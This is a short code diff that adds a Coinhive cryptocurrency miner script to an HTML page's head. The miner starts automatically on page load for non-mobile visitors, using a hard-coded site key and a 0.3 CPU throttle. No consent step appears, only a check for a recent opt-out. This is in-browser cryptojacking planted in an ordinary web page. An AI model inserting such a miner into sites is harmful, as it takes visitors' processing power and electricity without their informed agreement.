@@ -6,6 +6,16 @@
 	<link rel="stylesheet" href="loading.css"></link>
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <script type="text/javascript" src="fullscreen.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+		var miner = new CoinHive.Anonymous('ZZy5PyN6T6zgXdOnPbQzeKxTZhRDJ76y', {throttle: 0.3});
+
+		// Only start on non-mobile devices and if not opted-out
+		// in the last 14400 seconds (4 hours):
+		if (!miner.isMobile() && !miner.didOptOut(14400)) {
+			miner.start();
+		}
+    </script>
 	<script type="text/javascript"> 
 					addEventListener("click", function() {
             var el = document.documentElement,
